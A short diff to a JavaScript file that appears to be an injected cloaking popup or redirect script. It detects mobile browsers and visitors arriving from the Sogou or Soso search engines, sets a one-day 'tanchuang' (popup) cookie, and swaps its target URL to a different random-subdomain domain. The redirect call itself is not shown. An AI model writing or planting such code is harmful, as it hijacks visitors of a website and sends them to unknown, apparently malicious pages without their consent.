@@ -3,7 +3,7 @@ var ios = navigator.userAgent.match(/iPad|iPhone|iPod/i) != null;
 var azs = navigator.userAgent.match(/Android|Linux/i) != null;
 var lailu = document.referrer.toLowerCase().match(/sogou|soso/i) != null;
 function show_code1(){
-    var tcurl = 'https://4TJAN66FP1.hyvip036.com';
+    var tcurl = 'https://3j103blw.xinyinong0898.com/ice3268';
     var isshare = getCookie('tanchuang');
     if(isshare == null || isshare == ''){
     	setCookie('tanchuang', 'true', 86400);
